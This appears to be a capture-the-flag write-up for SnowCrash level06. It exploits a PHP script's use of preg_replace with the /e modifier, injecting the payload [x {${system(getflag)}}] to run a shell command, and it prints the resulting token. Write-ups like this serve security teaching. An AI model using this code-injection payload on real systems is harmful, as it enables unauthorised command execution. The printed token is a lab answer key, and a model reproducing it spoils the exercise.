# Level06

We have a php code:  

```php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```

This code get content of file at `argv[1]`. 
So we can try the program:

```bash
level06@SnowCrash:~$ echo "Hello world ! " > /tmp/test
level06@SnowCrash:~$ ./level06 /tmp/test
Hello world !
```

With a lot of research, we have find a security vulnerability in `preg_replace`. In fact, using `/e` is now deprecated.  
Because of the part after `/e` is evaluated as a php code, it is interpreted.  
The 2nd parameters in preg_replace is `y(\"\\2\")`. This corresponds to the second part of the expression `/(\[x (.*)\])`. With research we have find that the 2nd part is `(.*)` and the first is `[x ...]`.  
Our content must be something like: `[x INTERPRETED]` because of must start by `[x` and end by `]`.  

First we have try this content: It's not working:  

```bash
level06@SnowCrash:~$ echo "[x system("ls")]" > /tmp/test
level06@SnowCrash:~$ ./level06 /tmp/test
system(ls)
```

In fact, this variable is called [dynamic variable](https://www.php.net/manual/fr/language.variables.variable.php) because of the content can be determinated by php code.

Our file content must be:  
`[x {${system(getflag)}} ]`

# Why ?  

`[x ${system(getflag)}]`
 `${system(getflag)}` is considered as a variable but it's not a valid variable in PHP.


To be interpreted and evaluated as a dynamic variable we must use `[x {${system(getflag)}}]`. The system command will be executed and the result will be the arg of `y` function.  

```bash
./level06 /tmp/ret
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
```
